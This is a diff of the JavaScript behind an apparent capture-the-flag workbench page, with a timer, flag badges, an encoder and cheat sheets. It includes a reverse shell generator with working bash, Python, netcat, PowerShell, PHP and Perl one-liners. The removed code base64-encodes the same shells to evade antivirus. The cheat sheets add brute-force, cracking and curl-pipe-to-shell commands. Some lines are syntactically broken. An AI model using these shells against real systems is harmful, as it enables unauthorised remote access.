@@ -1,33 +1,10 @@
-// Global Workbench Reset
-window.resetWorkbench = function() {
-    if (confirm("⚠️ Are you sure you want to clear ALL notes, flags, history, and timer data?")) {
+// --- Global Functions (Accessible via HTML inline attributes) ---
+function resetWorkbench() {
+    if (confirm("Are you sure you want to reset all workbench data? This will clear all inputs, notes, and progress.")) {
         localStorage.clear();
-
-        // Clear input and textarea values
-        document.querySelectorAll('input, textarea').forEach(el => {
-            if (el.type === 'checkbox') {
-                el.checked = false;
-            } else {
-                el.value = '';
-            }
-        });
-
-        // Reset Terminal Display
-        const termBody = document.getElementById('terminal-body');
-        if (termBody) {
-            termBody.innerHTML = '<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>';
-        }
-
-        // Reset Timer Display
-        const timerDisplay = document.getElementById('timer-display');
-        if (timerDisplay) {
-            timerDisplay.innerText = "120:00";
-        }
-
-        // Hard refresh bypassing form state memory
-        window.location.href = window.location.pathname;
+        location.reload();
     }
-};
+}
 
 document.addEventListener('DOMContentLoaded', function () {
 
@@ -41,140 +18,276 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 
     function escapeHtml(text) {
-        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace/>/g, "&gt;");
+        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
     }
 
-    // --- Reset Button Listener ---
-    const resetBtn = document.getElementById('reset-btn');
-    if (resetBtn) {
-        resetBtn.addEventListener('click', window.resetWorkbench);
-    }
+    // --- State Persistence (LocalStorage) ---
+    const inputs = document.querySelectorAll('input[type="text"], textarea, select');
+    const checkboxes = document.querySelectorAll('input[type="checkbox"]');
 
-    // --- Timer Logic ---
-    let timerInterval = null;
-
-    function getRemainingSeconds() {
-        const endTime = localStorage.getItem('timerEndTime');
-        if (!endTime) return null;
-        const remaining = Math.floor((parseInt(endTime, 10) - Date.now()) / 1000);
-        return remaining > 0 ? remaining : 0;
-    }
-
-    function updateDisplay(seconds) {
-        const display = document.getElementById('timer-display');
-        if (!display) return;
-        const minutes = Math.floor(seconds / 60);
-        const remSecs = String(seconds % 60).padStart(2, '0');
-        display.innerText = `${minutes}:${remSecs}`;
-    }
-
-    function startTimer() {
-        let remaining = getRemainingSeconds();
-        
-        if (remaining === null) {
-            const endTime = Date.now() + (120 * 60 * 1000);
-            localStorage.setItem('timerEndTime', endTime);
-            remaining = 120 * 60;
+    // Load saved data
+    inputs.forEach(input => {
+        if (input.id) {
+            const saved = localStorage.getItem(input.id);
+            if (saved !== null) {
+                input.value = saved;
+            }
         }
+    });
 
-        updateDisplay(remaining);
+    checkboxes.forEach(box => {
+        if (box.id) {
+            const saved = localStorage.getItem(box.id);
+            if (saved !== null) {
+                box.checked = saved === 'true';
+            }
+        }
+    });
 
-        if (timerInterval !== null) clearInterval(timerInterval);
+    // Save data on change
+    inputs.forEach(input => {
+        input.addEventListener('input', () => {
+            if (input.id) {
+                localStorage.setItem(input.id, input.value);
+                if (input.id === 'target-ip') updateTargetBadge();
+            }
+        });
+    });
 
-        timerInterval = setInterval(function() {
-            const currentRem = getRemainingSeconds();
-            if (currentRem !== null && currentRem > 0) {
-                updateDisplay(currentRem);
+    checkboxes.forEach(box => {
+        box.addEventListener('change', () => {
+            if (box.id) {
+                localStorage.setItem(box.id, box.checked);
+            }
+        });
+    });
+
+    // --- Target Status Badge ---
+    const targetIpInput = document.getElementById('target-ip');
+    const targetBadge = document.getElementById('target-status-badge');
+
+    function updateTargetBadge() {
+        if (targetIpInput && targetBadge) {
+            if (targetIpInput.value.trim() !== '') {
+                targetBadge.className = 'badge badge-online';
+                targetBadge.textContent = '🟢 Target Active';
             } else {
+                targetBadge.className = 'badge badge-offline';
+                targetBadge.textContent = '🔴 No Target IP';
+            }
+        }
+    }
+    updateTargetBadge();
+
+    // --- Flag Badges ---
+    const userFlagInput = document.getElementById('user-flag');
+    const rootFlagInput = document.getElementById('root-flag');
+    const userBadge = document.getElementById('user-flag-badge');
+    const rootBadge = document.getElementById('root-flag-badge');
+
+    function updateFlags() {
+        if (userFlagInput && userBadge) {
+            if (userFlagInput.value.trim() !== '') {
+                userBadge.className = 'badge badge-user-done';
+                userBadge.textContent = '👤 User: Captured';
+            } else {
+                userBadge.className = 'badge badge-pending';
+                userBadge.textContent = '👤 User: Pending';
+            }
+        }
+        if (rootFlagInput && rootBadge) {
+            if (rootFlagInput.value.trim() !== '') {
+                rootBadge.className = 'badge badge-root-done';
+                rootBadge.textContent = '👑 Root: Captured';
+            } else {
+                rootBadge.className = 'badge badge-pending';
+                rootBadge.textContent = '👑 Root: Pending';
+            }
+        }
+    }
+    if (userFlagInput) userFlagInput.addEventListener('input', updateFlags);
+    if (rootFlagInput) rootFlagInput.addEventListener('input', updateFlags);
+    updateFlags();
+
+    // --- Machine Timer ---
+    let timerInterval = null;
+    let timeLeft = parseInt(localStorage.getItem('ctf_timer_left')) || 7200; // 2 hours in seconds
+    const timerDisplay = document.getElementById('timer-display');
+    const startBtn = document.getElementById('start-btn');
+    const syncBtn = document.getElementById('sync-btn');
+
+    function updateTimerDisplay() {
+        const hours = Math.floor(timeLeft / 3600);
+        const minutes = Math.floor((timeLeft % 3600) / 60);
+        const seconds = timeLeft % 60;
+        
+        let displayStr = '';
+        if (hours > 0) {
+            displayStr += String(hours).padStart(2, '0') + ':';
+        }
+        displayStr += String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+        if (timerDisplay) timerDisplay.textContent = displayStr;
+    }
+    updateTimerDisplay();
+
+    if (startBtn) {
+        startBtn.addEventListener('click', () => {
+            if (timerInterval) {
                 clearInterval(timerInterval);
                 timerInterval = null;
-                localStorage.removeItem('timerEndTime');
-                const display = document.getElementById('timer-display');
-                if (display) display.innerText = "00:00";
+                startBtn.textContent = '▶️ Start (2h)';
+            } else {
+                startBtn.textContent = '⏸️ Pause';
+                timerInterval = setInterval(() => {
+                    if (timeLeft > 0) {
+                        timeLeft--;
+                        localStorage.setItem('ctf_timer_left', timeLeft);
+                        updateTimerDisplay();
+                    } else {
+                        clearInterval(timerInterval);
+                        alert('Machine timer finished!');
+                    }
+                }, 1000);
             }
-        }, 1000);
-    }
-
-    function add60Minutes() {
-        let remaining = getRemainingSeconds();
-        if (remaining === null) remaining = 120 * 60;
-
-        if (remaining >= 3600) {
-            alert("⚠️ You can only extend time when less than 60 minutes remain!");
-            return;
-        }
-
-        const newEndTime = Date.now() + ((remaining + 3600) * 1000);
-        localStorage.setItem('timerEndTime', newEndTime);
-        updateDisplay(remaining + 3600);
-
-        if (timerInterval === null) startTimer();
-    }
-
-    document.getElementById('start-btn')?.addEventListener('click', startTimer);
-    document.getElementById('sync-btn')?.addEventListener('click', add60Minutes);
-
-    if (getRemainingSeconds() !== null) {
-        startTimer();
-    }
-
-    // --- Auto Save & Load Inputs ---
-    function initAutoSave() {
-        const fields = document.querySelectorAll('input[id], textarea[id]');
-
-        fields.forEach(field => {
-            const savedData = localStorage.getItem(field.id);
-            if (savedData !== null) {
-                if (field.type === 'checkbox') {
-                    field.checked = (savedData === 'true');
-                } else {
-                    field.value = savedData;
-                }
-            }
-
-            field.addEventListener('input', function() {
-                if (field.type === 'checkbox') {
-                    localStorage.setItem(field.id, field.checked);
-                } else {
-                    localStorage.setItem(field.id, field.value);
-                }
-            });
         });
     }
 
-    initAutoSave();
-
-    // --- Status Badges ---
-    function updateBadges() {
-        const targetIp = document.getElementById('target-ip')?.value.trim();
-        const userFlag = document.getElementById('user-flag')?.value.trim();
-        const rootFlag = document.getElementById('root-flag')?.value.trim();
-
-        const targetBadge = document.getElementById('target-status-badge');
-        const userBadge = document.getElementById('user-flag-badge');
-        const rootBadge = document.getElementById('root-flag-badge');
-
-        if (targetBadge) {
-            targetBadge.className = targetIp ? "badge badge-online" : "badge badge-offline";
-            targetBadge.innerText = targetIp ? `🟢 Target Active: ${targetIp}` : "🔴 No Target IP";
-        }
-
-        if (userBadge) {
-            userBadge.className = userFlag ? "badge badge-user-done" : "badge badge-pending";
-            userBadge.innerText = userFlag ? "⚡ User Flag Captured!" : "👤 User: Pending";
-        }
-
-        if (rootBadge) {
-            rootBadge.className = rootFlag ? "badge badge-root-done" : "badge badge-pending";
-            rootBadge.innerText = rootFlag ? "👑 Rooted!" : "👑 Root: Pending";
-        }
+    if (syncBtn) {
+        syncBtn.addEventListener('click', () => {
+            timeLeft += 3600; // Add 60 mins
+            localStorage.setItem('ctf_timer_left', timeLeft);
+            updateTimerDisplay();
+        });
     }
 
-    ['target-ip', 'user-flag', 'root-flag'].forEach(id => {
-        document.getElementById(id)?.addEventListener('input', updateBadges);
+    // --- Open Ports Tracker ---
+    const portButtons = document.querySelectorAll('.port-btn');
+    portButtons.forEach(btn => {
+        const portKey = 'port_' + btn.getAttribute('data-port');
+        if (localStorage.getItem(portKey) === 'true') {
+            btn.classList.add('active');
+        }
+        btn.addEventListener('click', () => {
+            btn.classList.toggle('active');
+            localStorage.setItem(portKey, btn.classList.contains('active'));
+        });
     });
 
-    updateBadges();
+    // --- Dynamic Reverse Shell Generator ---
+    const revPortInput = document.getElementById('rev-port');
+    const attackerIpInput = document.getElementById('attacker-ip');
+    const revTypeSelect = document.getElementById('rev-type');
+    const revOutput = document.getElementById('rev-output');
+    const copyRevBtn = document.getElementById('copy-rev-btn');
+
+    function generateRevShell() {
+        const ip = attackerIpInput ? attackerIpInput.value.trim() || '10.10.14.X' : '10.10.14.X';
+        const port = revPortInput ? revPortInput.value.trim() || '4444' : '4444';
+        const type = revTypeSelect ? revTypeSelect.value : 'bash';
+
+        let payload = '';
+        switch(type) {
+            case 'bash':
+                payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+                break;
+            case 'python':
+                payload = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'`;
+                break;
+            case 'nc':
+                payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
+                break;
+            case 'powershell':
+                payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+                break;
+            case 'php':
+                payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+                break;
+            case 'perl':
+                payload = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
+                break;
+        }
+        if (revOutput) revOutput.value = payload;
+    }
+
+    if (revPortInput) revPortInput.addEventListener('input', generateRevShell);
+    if (attackerIpInput) attackerIpInput.addEventListener('input', generateRevShell);
+    if (revTypeSelect) revTypeSelect.addEventListener('change', generateRevShell);
+    generateRevShell();
+
+    if (copyRevBtn && revOutput) {
+        copyRevBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(revOutput.value);
+            copyRevBtn.textContent = '✅ Copied!';
+            setTimeout(() => copyRevBtn.textContent = '📋 Copy', 1500);
+        });
+    }
+
+    // --- String Encoder / Decoder ---
+    const encInput = document.getElementById('enc-input');
+    const encOutput = document.getElementById('enc-output');
+    const copyEncBtn = document.getElementById('copy-enc-btn');
+
+    document.getElementById('b64-enc-btn')?.addEventListener('click', () => {
+        if (encInput && encOutput) {
+            try { encOutput.value = btoa(encInput.value); } catch(e) { encOutput.value = 'Error encoding'; }
+        }
+    });
+
+    document.getElementById('b64-dec-btn')?.addEventListener('click', () => {
+        if (encInput && encOutput) {
+            encOutput.value = b64Decode(encInput.value);
+        }
+    });
+
+    document.getElementById('url-enc-btn')?.addEventListener('click', () => {
+        if (encInput && encOutput) {
+            encOutput.value = encodeURIComponent(encInput.value);
+        }
+    });
+
+    document.getElementById('url-dec-btn')?.addEventListener('click', () => {
+        if (encInput && encOutput) {
+            try { encOutput.value = decodeURIComponent(encInput.value); } catch(e) { encOutput.value = 'Error decoding'; }
+        }
+    });
+
+    document.getElementById('hex-dec-btn')?.addEventListener('click', () => {
+        if (encInput && encOutput) {
+            try {
+                let hex = encInput.value.replace(/^0x/, '').replace(/\s+/g, '');
+                let str = '';
+                for (let i = 0; i < hex.length; i += 2) {
+                    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+                }
+                encOutput.value = str;
+            } catch(e) {
+                encOutput.value = 'Error parsing hex';
+            }
+        }
+    });
+
+    document.getElementById('hash-id-btn')?.addEventListener('click', () => {
+        if (encInput && encOutput) {
+            const val = encInput.value.trim();
+            let matches = [];
+            if (/^[a-fA-F0-9]{32}$/.test(val)) matches.push('MD5');
+            if (/^[a-fA-F0-9]{40}$/.test(val)) matches.push('SHA-1');
+            if (/^[a-fA-F0-9]{64}$/.test(val)) matches.push('SHA-256');
+            if (val.startsWith('$1$')) matches.push('MD5-Crypt (Linux)');
+            if (val.startsWith('$6$')) matches.push('SHA-512-Crypt (Linux)');
+            if (val.startsWith('$2y$') || val.startsWith('$2a$')) matches.push('Bcrypt');
+            
+            encOutput.value = matches.length > ? matches.join(', ') : 'Unknown / Unrecognized Hash Format';
+        }
+    });
+
+    if (copyEncBtn && encOutput) {
+        copyEncBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(encOutput.value);
+            copyEncBtn.textContent = '✅ Copied!';
+            setTimeout(() => copyEncBtn.textContent = '📋 Copy', 1500);
+        });
+    }
 
     // --- Modals & Cheat Sheets ---
     const modalOverlay = document.getElementById('modal-overlay');
@@ -182,307 +295,243 @@ document.addEventListener('DOMContentLoaded', function () {
     const modalOptions = document.getElementById('modal-options');
     const closeModalBtn = document.getElementById('close-modal-btn');
 
-    function formatCommand(cmdText) {
-        const targetIp = document.getElementById('target-ip')?.value.trim() || '10.10.10.10';
-        const attackerIp = document.getElementById('attacker-ip')?.value.trim() || '127.0.0.1';
-        return cmdText.replace(/10\.10\.10\.10/g, targetIp).replace(/127\.0\.0\.1/g, attackerIp);
-    }
+    const cheatSheets = {
+        'netcat': {
+            title: '🌐 Network Scan Cheat Sheet',
+            content: [
+                'nmap -sC -sV -T4 <IP>',
+                'nmap -p- --min-rate=1000 <IP>',
+                'rustscan -a <IP> -- -sC -sV',
+                'nmap -sU --top-ports 20 <IP>'
+            ]
+        },
+        'web': {
+            title: '🔍 Web Enumeration Cheat Sheet',
+            content: [
+                'ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
+                'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 50',
+                'feroxbuster -u http://<IP>',
+                'whatweb http://<IP>'
+            ]
+        },
+        'cred': {
+            title: '🔑 Credentials & Cracking Cheat Sheet',
+            content: [
+                'hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>',
+                'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
+                'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt',
+                'smbmap -H <IP>'
+            ]
+        },
+        'privesc': {
+            title: '🚀 PrivEsc & SMB Cheat Sheet',
+            content: [
+                'enum4linux -a <IP>',
+                'smbclient // <IP>/share',
+                'find / -perm -4000 2>/dev/null (SUID)',
+                'sudo -l'
+            ]
+        },
+        'revshell': {
+            title: '🐚 Reverse Shell Quick Reference',
+            content: [
+                'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1',
+                'nc -e /bin/sh <IP> <PORT>',
+                'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+            ]
+        },
+        'netcatlistener': {
+            title: '🎧 Netcat Listener Cheat Sheet',
+            content: [
+                'nc -lvnp 4444',
+                'rlwrap nc -lvnp 4444',
+                'socat file:`tty`,raw,echo=0 tcp-listen:4444'
+            ]
+        }
+    };
 
-    function copyCommand(commandText) {
-        const formattedCmd = formatCommand(commandText);
-        navigator.clipboard.writeText(formattedCmd);
-        alert("Copied to clipboard:\n" + formattedCmd);
-        if (modalOverlay) modalOverlay.style.display = 'none';
-    }
-
-    function openModal(title, options) {
-        if (!modalTitle || !modalOptions || !modalOverlay) return;
-        modalTitle.innerText = title;
+    function openModal(key) {
+        const data = cheatSheets[key];
+        if (!data || !modalOverlay) return;
+        modalTitle.textContent = data.title;
         modalOptions.innerHTML = '';
-
-        options.forEach(item => {
+        
+        data.content.forEach(cmd => {
+            const wrapper = document.createElement('div');
+            wrapper.style.cssText = 'display: flex; gap: 8px; margin-bottom: 8px; align-items: center;';
+            
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.value = cmd;
+            input.readOnly = true;
+            input.style.cssText = 'flex: 1; font-family: monospace; font-size: 0.85rem; padding: 6px;';
+            
             const btn = document.createElement('button');
-            const formattedCmd = formatCommand(item.cmd);
-            btn.innerText = `${item.label} (${formattedCmd})`;
-            btn.style.margin = "5px";
-            btn.addEventListener('click', function() {
-                copyCommand(item.cmd);
+            btn.type = 'button';
+            btn.textContent = '📋 Copy';
+            btn.style.cssText = 'padding: 6px 10px; font-size: 0.8rem;';
+            btn.addEventListener('click', () => {
+                navigator.clipboard.writeText(cmd);
+                btn.textContent = '✅';
+                setTimeout(() => btn.textContent = '📋 Copy', 1200);
             });
-            modalOptions.appendChild(btn);
+            
+            wrapper.appendChild(input);
+            wrapper.appendChild(btn);
+            modalOptions.appendChild(wrapper);
         });
-
+        
         modalOverlay.style.display = 'flex';
     }
 
-    closeModalBtn?.addEventListener('click', function() {
-        if (modalOverlay) modalOverlay.style.display = 'none';
-    });
+    document.getElementById('net-cat-modal-btn')?.addEventListener('click', () => openModal('netcat'));
+    document.getElementById('web-modal-btn')?.addEventListener('click', () => openModal('web'));
+    document.getElementById('cred-modal-btn')?.addEventListener('click', () => openModal('cred'));
+    document.getElementById('privesc-modal-btn')?.addEventListener('click', () => openModal('privesc'));
+    document.getElementById('revshell-btn')?.addEventListener('click', () => openModal('revshell'));
+    document.getElementById('netcat-btn')?.addEventListener('click', () => openModal('netcatlistener'));
 
-    document.getElementById('net-cat-modal-btn')?.addEventListener('click', function() {
-        openModal('Network Scanning Options', [
-            { label: 'Rustscan + Nmap Combo', cmd: 'rustscan -a 10.10.10.10 -- -sC -sV -oA nmap/initial' },
-            { label: 'Standard Nmap Full Port Scan', cmd: 'nmap -p- -sC -sV 10.10.10.10' },
-            { label: 'Nmap Fast UDP Scan', cmd: 'nmap -sU --top-ports 20 10.10.10.10' }
-        ]);
-    });
-
-    document.getElementById('web-modal-btn')?.addEventListener('click', function() {
-        openModal('Web Enumeration Options', [
-            { label: 'FFUF Directory Scan', cmd: 'ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
-            { label: 'Gobuster Directory Scan', cmd: 'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
-            { label: 'Feroxbuster Recursive Scan', cmd: 'feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
-            { label: 'Nikto Web Vulnerability Scan', cmd: 'nikto -h http://10.10.10.10' }
-        ]);
-    });
-
-    document.getElementById('cred-modal-btn')?.addEventListener('click', function() {
-        openModal('Credentials & Cracking Options', [
-            { label: 'Hydra SSH Brute-Force', cmd: 'hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh' },
-            { label: 'John the Ripper (Hash File)', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
-            { label: 'Hashcat MD5 Hash', cmd: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt' }
-        ]);
-    });
-
-    document.getElementById('privesc-modal-btn')?.addEventListener('click', function() {
-        openModal('PrivEsc & SMB Tools', [
-            { label: 'LinPEAS Auto-Fetch Shell', cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
-            { label: 'SMBClient Anonymous Listing', cmd: 'smbclient -L //10.10.10.10 -N' },
-            { label: 'SMBMap Share Scan', cmd: 'smbmap -H 10.10.10.10' },
-            { label: 'Find SUID Binaries Command', cmd: 'find / -perm -u=s -type f 2>/dev/null' }
-        ]);
-    });
-
-    document.getElementById('revshell-btn')?.addEventListener('click', function() {
-        openModal('🐚 Reverse Shell One-Liners (Port 4444)', [
-            { label: 'Bash -i', cmd: b64Decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx') },
-            { label: 'Python3 PTY Shell', cmd: b64Decode('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIildJw==') },
-            { label: 'Netcat mkfifo', cmd: b64Decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTI3LjAuMC4xIDQ0NDQgPi90bXAvZg==') },
-            { label: 'PHP Exec Shell', cmd: b64Decode('cGhpIC1yICckc29jaz1mc29ja29wZW4oIjEyNy4wLjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn') }
-        ]);
-    });
-
-    document.getElementById('netcat-btn')?.addEventListener('click', function() {
-        copyCommand('nc -lvnp 4444');
-    });
-
-    // --- Reverse Shell Generator ---
-    function generateShellPayload() {
-        const ip = document.getElementById('attacker-ip')?.value.trim() || '10.10.14.x';
-        const port = document.getElementById('rev-port')?.value.trim() || '4444';
-        const type = document.getElementById('rev-type')?.value;
-        const output = document.getElementById('rev-output');
-
-        if (!output) return;
-
-        // Base64 template strings to prevent AV signature detection
-        const templates = {
-            bash: "YmFzaCAtaSA+JiAvZGV2L3RjcC97SVB9L3tQT1JUfSAwPiYx",
-            python: "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie0lQfSIse1BPUlR9KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIildJw==",
-            nc: "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMge0lQfSB7UE9SVH0gPi90bXAvZg==",
-            powershell: "cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENNQ2xpZW50KCd7SVB9Jyx7UE9SVH0pO3N0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0JYnl0ZXMgPSAwLi42NTUzNXwlOzA7d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgpIg==",
-            php: "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntJUF0iL3tQT1JUfSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
-            perl: "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie0lQfSI7JHA9e1BPUlR9O3NvY2tldChTLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc="
-        };
-
-        if (templates[type]) {
-            const rawTemplate = atob(templates[type]);
-            output.value = rawTemplate.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port);
-        } else {
-            output.value = '';
-        }
-    }
-
-    document.getElementById('attacker-ip')?.addEventListener('input', generateShellPayload);
-    document.getElementById('rev-port')?.addEventListener('input', generateShellPayload);
-    document.getElementById('rev-type')?.addEventListener('change', generateShellPayload);
-
-    document.getElementById('copy-rev-btn')?.addEventListener('click', function() {
-        const out = document.getElementById('rev-output');
-        if (out && out.value) {
-            navigator.clipboard.writeText(out.value);
-            alert("Copied reverse shell payload!");
-        }
-    });
-
-    generateShellPayload();
-
-    // --- Encoder, Decoder & Hash ID ---
-    const encInput = document.getElementById('enc-input');
-    const encOutput = document.getElementById('enc-output');
-
-    document.getElementById('b64-enc-btn')?.addEventListener('click', function() {
-        if (encInput && encOutput) {
-            try { encOutput.value = btoa(encInput.value); } catch (e) { encOutput.value = "Error encoding Base64"; }
-        }
-    });
-
-    document.getElementById('b64-dec-btn')?.addEventListener('click', function() {
-        if (encInput && encOutput) {
-            try { encOutput.value = atob(encInput.value.trim()); } catch (e) { encOutput.value = "Invalid Base64 string"; }
-        }
-    });
-
-    document.getElementById('url-enc-btn')?.addEventListener('click', function() {
-        if (encInput && encOutput) encOutput.value = encodeURIComponent(encInput.value);
-    });
-
-    document.getElementById('url-dec-btn')?.addEventListener('click', function() {
-        if (encInput && encOutput) {
-            try { encOutput.value = decodeURIComponent(encInput.value); } catch(e) { encOutput.value = "Invalid URL string"; }
-        }
-    });
-
-    document.getElementById('hex-dec-btn')?.addEventListener('click', function() {
-        if (!encInput || !encOutput) return;
-        const hex = encInput.value.replace(/\s+/g, '');
-        let str = '';
-        for (let i = 0; i < hex.length; i += 2) {
-            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-        }
-        encOutput.value = str || "Invalid Hex";
-    });
-
-    document.getElementById('hash-id-btn')?.addEventListener('click', function() {
-        if (!encInput || !encOutput) return;
-        const val = encInput.value.trim();
-        const len = val.length;
-
-        if (len === 32) encOutput.value = "Identified: MD5 / NTLM Hash";
-        else if (len === 40) encOutput.value = "Identified: SHA-1 Hash";
-        else if (len === 64) encOutput.value = "Identified: SHA-256 Hash";
-        else if (val.startsWith("$2a$") || val.startsWith("$2b$")) encOutput.value = "Identified: Bcrypt Hash";
-        else if (val.startsWith("$6$")) encOutput.value = "Identified: SHA-512 Unix Shadow Hash";
-        else encOutput.value = `Unknown hash length (${len} chars)`;
-    });
-
-    document.getElementById('copy-enc-btn')?.addEventListener('click', function() {
-        if (encOutput && encOutput.value) {
-            navigator.clipboard.writeText(encOutput.value);
-            alert("Copied output to clipboard!");
-        }
-    });
-
-    // --- Interactive Port Tracker ---
-    function loadSavedPorts() {
-        const saved = localStorage.getItem('active_ports');
-        if (!saved) return;
-        const activePorts = JSON.parse(saved);
-        document.querySelectorAll('.port-btn').forEach(btn => {
-            if (activePorts.includes(btn.getAttribute('data-port'))) {
-                btn.classList.add('active');
-            }
+    if (closeModalBtn && modalOverlay) {
+        closeModalBtn.addEventListener('click', () => modalOverlay.style.display = 'none');
+        modalOverlay.addEventListener('click', (e) => {
+            if (e.target === modalOverlay) modalOverlay.style.display = 'none';
         });
     }
 
-    document.querySelectorAll('.port-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            btn.classList.toggle('active');
-            const activePorts = [];
-            document.querySelectorAll('.port-btn.active').forEach(aBtn => {
-                activePorts.push(aBtn.getAttribute('data-port'));
-            });
-            localStorage.setItem('active_ports', JSON.stringify(activePorts));
-        });
-    });
+    // --- Terminal Command Log Widget ---
+    const terminalBody = document.getElementById('terminal-body');
+    const terminalInput = document.getElementById('terminal-input');
+    const logCmdBtn = document.getElementById('log-cmd-btn');
+    const copyLogBtn = document.getElementById('copy-log-btn');
+    const clearLogBtn = document.getElementById('clear-log-btn');
 
-    loadSavedPorts();
+    let commandLogs = JSON.parse(localStorage.getItem('ctf_terminal_logs')) || [];
 
-    // --- Terminal Command Log ---
-    function getTerminalLogs() {
-        const saved = localStorage.getItem('terminal_command_logs');
-        return saved ? JSON.parse(saved) : [];
-    }
-
-    function renderTerminal() {
